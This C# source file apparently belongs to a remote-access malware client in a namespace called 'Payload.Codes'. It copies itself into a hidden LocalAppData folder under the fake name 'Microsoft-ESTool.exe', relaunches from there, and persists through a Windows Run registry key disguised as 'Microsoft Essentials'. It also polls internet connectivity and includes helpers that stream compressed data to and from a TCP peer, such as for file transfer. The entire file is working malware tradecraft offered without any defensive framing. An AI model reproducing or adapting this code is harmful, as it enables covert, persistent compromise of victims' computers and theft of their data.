using System;
using System.Threading.Tasks;
using System.Reflection;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using EasyTcp4;
using System.Net.Http;
using System.IO.Compression;
using System.Threading;
using System.Net;
using System.Net.NetworkInformation;

namespace Payload.Codes
{
    public static class VUtils
    {
        private static bool IsNetAvailable = false;
        private static readonly string[] HostToPing = new string[2];

        public static event InternetChanged OnInternetChanged;
        public delegate void InternetChanged(bool IsConnected);

        public const double Version = 1;
        public static Stopwatch SWTracer { get; } = new Stopwatch();
        public static string WorkDir
        { get => Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft-CManager\"; }

        public static void Initialize()
        {
            try
            {
                Directory.CreateDirectory(WorkDir);
                string FakeName = "Microsoft-ESTool.exe";
                string ThisFileName = AppDomain.CurrentDomain.FriendlyName;
                var CDir = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty);

                if (Path.GetDirectoryName(CDir) != Path.GetDirectoryName(WorkDir))
                {
                    var SDir = $"\"{CDir}\"";
                    File.Copy(CDir, WorkDir + FakeName, true);
                    Process.Start(WorkDir + FakeName, SDir);
                    Environment.Exit(0);
                    return;
                }
                else
                {
                    HostToPing[0] = "www.msftncsi.com";
                    Directory.SetCurrentDirectory(WorkDir);
                    HostToPing[1] = "www.msftconnecttest.com"; LoopInternetCheck();
                    RegistryKey RK = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    try { RK.SetValue("Microsoft Essentials 0x00860", CDir, RegistryValueKind.String); } catch { }
                }
            }
            catch (Exception Ep) { Console.WriteLine(Ep); }
        }

        public static async Task<string> GetAsync(this string URL, bool IsInfinite = true)
        {
            var TOut = IsInfinite ? TimeSpan.FromMilliseconds(-1) :
                TimeSpan.FromMilliseconds(30 * 1000);

            using (var HGetter = new HttpClient { Timeout = TOut })
            {
                var HRespMSG = await HGetter.GetAsync(URL);
                if (!HRespMSG.IsSuccessStatusCode) return null;
                else return await HRespMSG.Content.ReadAsStringAsync();
            }
        }

        public static async Task<bool> IsNetConnected()
        {
            int Count = -1; ReCheck:; Count++;
            if (await HasPinged(HostToPing[Count])) return true;
            else if (Count < 1) goto ReCheck;
            else return false;
        }

        private static async void LoopInternetCheck()
        {
            bool IsFirstUrl = true;
            string PingHost = HostToPing[0];

            while (true)
            {
                bool IsPinged = await HasPinged(PingHost);

                if (IsPinged)
                {
                    if (!IsNetAvailable)
                    {
                        IsNetAvailable = true;
                        OnInternetChanged?.Invoke(true);
                    }
                }
                else
                {
                    if (IsNetAvailable)
                    {
                        IsNetAvailable = false;
                        OnInternetChanged?.Invoke(false);
                    }
                }

                IsFirstUrl = !IsFirstUrl;
                if (IsPinged) await Task.Delay(4 * 1000);
                PingHost = IsFirstUrl ? HostToPing[0] : HostToPing[1];
            }
        }

        private static async Task<bool> HasPinged(string Host)
        {
            PingReply PReply = null;
            try
            {
                using (var NPinger = new Ping())
                    PReply = await NPinger.SendPingAsync(Host, 2000, new byte[32]);
            }
            catch { }
            return PReply != null && PReply.Status == 0;
        }
    }

    public class NetChecker : WebClient
    {
        private readonly string NetLink = string.Empty;
        public NetChecker(string NCheckURL) => NetLink = NCheckURL;

        public async Task<bool> IsInternetAvailable()
        {
            try { using (await OpenReadTaskAsync(NetLink)) return true; }
            catch { return false; }
        }

        protected override WebRequest GetWebRequest(Uri Addr)
        {
            var TimedReq = base.GetWebRequest(Addr);
            if (TimedReq != null) TimedReq.Timeout = 2000;
            return TimedReq;
        }
    }

    public static class StreamAddON
    {
        public static async Task PushStreamAsync(this EasyTcpClient RcvClient, Stream SndStream, Func<decimal, int> ProgressCallback = null)
        {
            if (RcvClient?.BaseSocket == null) throw new Exception("Could not send stream: client is not connected");
            if (!SndStream.CanRead) throw new InvalidDataException("Could not send stream: stream is not readable");

            decimal SndSize = SndStream.Length;
            var Buffer = new byte[1024]; int RData;
            var NetworkStream = RcvClient.Protocol.GetStream(RcvClient);
            var DataStream = new DeflateStream(NetworkStream, CompressionMode.Compress, true);
            await DataStream.WriteAsync(BitConverter.GetBytes(SndStream.Length), 0, 8); // Send Lenght Prefix

            while ((RData = await SndStream.ReadAsync(Buffer, 0, Buffer.Length)) > 0)
            {
                await DataStream.WriteAsync(Buffer, 0, RData);
                decimal ProgPercent = (SndSize - RData) / SndSize;
                ProgressCallback?.Invoke(Math.Round(ProgPercent * 100m, 4));
            }

            DataStream.Dispose();
        }

        public static async Task PullStreamAsync(this Message MRcv, Stream RcvStream, Func<decimal, int> ProgressCallback = null)
        {
            if (MRcv?.Client?.BaseSocket == null) throw new Exception("Could not send stream: client is not connected or mesage is invalid");
            if (!RcvStream.CanWrite) throw new InvalidDataException("Could not send stream: stream is not writable");

            const int BuffSize = 1024;
            var DLength = new byte[8]; int DRead;
            long TotalReceivedBytes = 0; var Buffer = new byte[BuffSize];
            var NetworkStream = MRcv.Client.Protocol.GetStream(MRcv.Client); long ReadCnt;
            var DataStream = new DeflateStream(NetworkStream, CompressionMode.Decompress, true);

            await DataStream.ReadAsync(DLength, 0, DLength.Length);
            ReadCnt = BitConverter.ToInt64(DLength, 0);

            while (TotalReceivedBytes < ReadCnt && (DRead = await DataStream.ReadAsync(Buffer, 0, (int)Math.Min(BuffSize, ReadCnt - TotalReceivedBytes))) > 0)
            {
                await RcvStream.WriteAsync(Buffer, 0, DRead); TotalReceivedBytes += DRead;
                decimal ProgPercent = (decimal)TotalReceivedBytes / ReadCnt * 100m;
                ProgressCallback?.Invoke(Math.Round(ProgPercent, 4));
            }

            if (RcvStream.CanSeek) RcvStream.Seek(0, SeekOrigin.Begin);
            DataStream.Dispose();
        }
    }
}